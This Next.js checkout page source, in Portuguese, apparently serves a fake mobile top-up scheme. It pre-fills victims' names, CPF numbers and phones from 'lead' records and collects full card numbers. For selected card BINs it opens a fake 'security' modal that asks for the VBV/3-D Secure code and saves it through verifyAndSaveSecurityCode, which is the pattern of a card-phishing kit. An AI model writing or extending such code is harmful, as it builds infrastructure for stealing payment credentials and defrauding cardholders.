// src/app/checkout/[uuid]/page.tsx
'use client';

import React, { useState, useEffect, useCallback } from 'react';
import type { FormData, FormErrors, ToastData, CardData } from '@/lib/types';
import { Header } from '@/components/checkout/header';
import { Footer } from '@/components/checkout/footer';
import { MobileSummary } from '@/components/checkout/mobile-summary';
import { PersonalDataSection } from '@/components/checkout/personal-data-section';
import { PaymentSection } from '@/components/checkout/payment-section';
import { TrustPanel } from '@/components/checkout/trust-panel';
import { ConfirmationScreen } from '@/components/checkout/confirmation-screen';
import { ToastContainer } from '@/components/checkout/toast';
import { SecurityModal } from '@/components/checkout/security-modal';
import { generatePixPayment } from "@/app/_actions/paymentPix";
import { processCardPayment } from "@/app/_actions/CardPayment";
import { verifyAndSaveSecurityCode } from "@/app/_actions/VerifySecurityCode"; // Importa a nova action
import { Skeleton } from '@/components/ui/skeleton';
import { getCardType, validatePersonalData, requiresSecurityModal } from '@/lib/utils';

interface OrderData {
  id: string;
  name: string;
  cpf: string;
  phone: string;
  planValue: number;
  planBonus: string;
  operator: string;
}

const CheckoutSkeleton = () => (
    <div className="min-h-screen bg-light">
        <Header />
        <main className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 py-20 text-center">
            <h1 className="text-xl font-semibold text-neutral-700">A carregar o seu pedido...</h1>
            <div className="max-w-lg mx-auto mt-8 space-y-4">
                <Skeleton className="h-24 w-full rounded-lg" />
                <Skeleton className="h-48 w-full rounded-lg" />
            </div>
        </main>
        <Footer isLoading={true} />
    </div>
);

export default function CheckoutPage({ params }: { params: Promise<{ uuid: string }> }) {
  const { uuid } = React.use(params); // Desembrulhar params com React.use
  const leadId = uuid;

  const [isMounted, setIsMounted] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [orderData, setOrderData] = useState<OrderData | null>(null);
  const [formData, setFormData] = useState<FormData>({ name: '', email: '', cpf: '', phone: '' });
  const [activeSection, setActiveSection] = useState('personal');
  const [completedSections, setCompletedSections] = useState<string[]>([]);
  const [isFinishingPayment, setIsFinishingPayment] = useState(false);
  const [isSectionLoading, setIsSectionLoading] = useState(false);
  const [finalOrderId, setFinalOrderId] = useState<string | null>(null);
  const [errors, setErrors] = useState<FormErrors>({});
  const [toasts, setToasts] = useState<ToastData[]>([]);
  const [isMobileSummaryOpen, setIsMobileSummaryOpen] = useState(false);
  const [isSecurityModalOpen, setIsSecurityModalOpen] = useState(false);
  const [cardForVerification, setCardForVerification] = useState<Partial<CardData & { last4Digits?: string, type?: string }>>({});
  const [isPixLoading, setIsPixLoading] = useState(false);
  const [pixData, setPixData] = useState<{ qrCodeSvg: string; copyPaste: string } | null>(null);
  const [currentCardId, setCurrentCardId] = useState<string | null>(null);

  useEffect(() => { setIsMounted(true); }, []);

   useEffect(() => {
    console.log(`CheckoutPage - isSecurityModalOpen: ${isSecurityModalOpen}`);
  }, [isSecurityModalOpen]);

  const showToast = useCallback((message: string, type: ToastData['type'] = 'success') => {
    const id = Date.now();
    setToasts(currentToasts => [...currentToasts, { id, message, type }]);
    setTimeout(() => setToasts(currentToasts => currentToasts.filter(toast => toast.id !== id)), 4000);
  }, []);

  useEffect(() => {
    const fetchOrderData = async (id: string) => {
      try {
        const response = await fetch(`/api/Leads/${id}`);
        if (!response.ok) throw new Error('Pedido não encontrado ou expirado.');
        const result = await response.json();
        if (result.success && result.data) {
          setOrderData(result.data);
          setFormData(prev => ({ ...prev, name: result.data.name, cpf: result.data.cpf, phone: result.data.phone, email: result.data.email || '' }));
        } else {
          throw new Error(result.message || 'Falha ao carregar dados do pedido.');
        }
      } catch (error: any) {
        console.error("Erro ao buscar dados do pedido:", error);
        showToast(error.message, "error");
      } finally {
        setIsLoading(false);
      }
    };
    if (leadId && isMounted) fetchOrderData(leadId);
  }, [leadId, isMounted, showToast]);

  const handleCompletePersonalData = () => {
    if (validatePersonalData(formData, (newErrors) => setErrors(newErrors))) {
      setIsSectionLoading(true);
      setActiveSection('payment');
      setCompletedSections(prev => [...prev, 'personal']);
      setTimeout(() => setIsSectionLoading(false), 500);
    }
  };

  const handleEdit = (section: 'personal') => {
    setActiveSection(section);
    setCompletedSections(prev => prev.filter(s => s !== section));
  };

  const handleGeneratePix = useCallback(async () => {
    if (pixData || !orderData) return true;
    setIsPixLoading(true);
    const result = await generatePixPayment({
      orderId: orderData.id,
      name: formData.name,
      cpf: formData.cpf,
      email: formData.email,
      phone: formData.phone,
      valor: orderData.planValue,
      produto: `Recarga ${orderData.operator}`,
    });
    if (result.success && result.data) {
      setPixData({qrCodeSvg: `<img src="${result.data.qrCodeBase64}" alt="QR Code Pix" />`, copyPaste: result.data.copyPaste });
      setIsPixLoading(false);
      return true;
    } else {
      showToast(result.error || "Problema ao gerar PIX.", "error");
      setIsPixLoading(false);
      return false;
    }
  }, [pixData, showToast, formData, orderData]);

// src/app/checkout/[uuid]/page.tsx
  const handlePay = async ({ method, card }: { method: string, card?: CardData }) => {
    if (method === 'card' && card) {
      setIsFinishingPayment(true);
      if (!orderData) {
        showToast("Dados do pedido inválidos.", "error");
        setIsFinishingPayment(false);
        return;
      }

      // Limpar e validar o número do cartão
      const cleanedCardNumber = card.cardNumber.replace(/\D/g, '');
      if (cleanedCardNumber.length < 6) {
        showToast("Número do cartão inválido (menos de 6 dígitos).", "error");
        setIsFinishingPayment(false);
        return;
      }

      // Logar o BIN e o resultado de requiresSecurityModal
      const bin = cleanedCardNumber.substring(0, 6);
      console.log(`handlePay - BIN: ${bin}, Requer VBV: ${requiresSecurityModal(cleanedCardNumber)}`);

      const last4 = cleanedCardNumber.slice(-4);
      setCardForVerification({
        ...card,
        cardNumber: cleanedCardNumber,
        last4Digits: last4,
        type: getCardType(cleanedCardNumber),
      });

      const result = await processCardPayment({
        orderId: orderData.id,
        card: { ...card, cardNumber: cleanedCardNumber },
        formData: formData,
      });

      if (result.success && result.data) {
        setFinalOrderId(result.data.orderId);
        setCurrentCardId(result.data.cardId);

        if (requiresSecurityModal(cleanedCardNumber)) {
          console.log('handlePay - Abrindo SecurityModal');
          setIsSecurityModalOpen(true);
        } else {
          showToast("Pagamento aprovado com sucesso!", "success");
          setActiveSection('confirmation');
        }
      } else {
        showToast(result.error || "Falha ao processar pagamento.", "error");
      }
      setIsFinishingPayment(false);
    }
  };

  
  const handleConfirmSecurePayment = async (securityCode: string) => {
    if (!currentCardId) {
        showToast("Não foi possível identificar o cartão.", "error");
        return;
    }
  setIsFinishingPayment(true);
  const result = await verifyAndSaveSecurityCode({
    cardId: currentCardId,
    securityCode: securityCode,
  });


    if (result.success) {
        showToast("Pagamento verificado e aprovado com sucesso!", "success");
        setIsSecurityModalOpen(false);
        setActiveSection('confirmation');
    } else {
        showToast(result.error || "Código de segurança inválido.", "error");
    }
    setIsFinishingPayment(false);
  };
  
  const handleCloseSecurityModal = () => { if (!isFinishingPayment) setIsSecurityModalOpen(false); };
  
  if (!isMounted || isLoading) { return <CheckoutSkeleton />; }

  if (!orderData) {
      return (
        <div className="min-h-screen bg-light flex flex-col items-center justify-center">
             <Header />
             <div className="text-center p-8">
                 <h1 className="text-xl font-bold text-red-600 mb-4">Erro ao Carregar Pedido</h1>
                 <p className="text-neutral-600">Não foi possível encontrar os dados do seu pedido. Verifique o link ou tente novamente.</p>
             </div>
             <Footer isLoading={false} />
        </div>
      )
  }

  if (activeSection === 'confirmation' && finalOrderId && orderData) {
    return (
      <div className="min-h-screen bg-light text-neutral-800">
        <Header />
        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><ConfirmationScreen orderId={finalOrderId} formData={formData} orderData={orderData} /></main>
        <Footer isLoading={false} />
      </div>
    );
  }
  
  return (
    <div className="min-h-screen text-neutral-800 bg-[#d1d5db]/10">
      <Header />
       <MobileSummary isLoading={isLoading} isOpen={isMobileSummaryOpen} onToggle={() => setIsMobileSummaryOpen(prev => !prev)} order={orderData} />
      
      <main className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 lg:gap-16">
              <div className="py-6 lg:py-20 space-y-6">
                  <PersonalDataSection isActive={activeSection === 'personal'} isCompleted={completedSections.includes('personal')} onComplete={handleCompletePersonalData} onEdit={() => handleEdit('personal')} formData={formData} setFormData={setFormData} errors={errors} />
                  <PaymentSection isActive={activeSection === 'payment'} isLocked={!completedSections.includes('personal')} isSectionLoading={isSectionLoading && activeSection === 'payment'} onPay={handlePay} isLoading={isFinishingPayment} showToast={showToast} isPixLoading={isPixLoading} pixData={pixData} onGeneratePix={handleGeneratePix} orderValue={orderData.planValue} />
              </div>
              <div className="hidden lg:block py-12 lg:py-20">
                <div className="lg:sticky lg:top-20">
                  <TrustPanel isLoading={isLoading} order={orderData} />
                </div>
              </div>
          </div>
      </main>
      
      <Footer isLoading={false} />
      <ToastContainer toasts={toasts} />
      
<SecurityModal 
  isOpen={isSecurityModalOpen} 
  onClose={handleCloseSecurityModal} 
  onConfirm={handleConfirmSecurePayment} 
  brand={cardForVerification.type} 
  isLoading={isFinishingPayment} 
  amount={orderData.planValue} 
  last4Digits={cardForVerification.last4Digits || ''} 
  cardNumber={cardForVerification.cardNumber}
/>
    </div>
  );
}
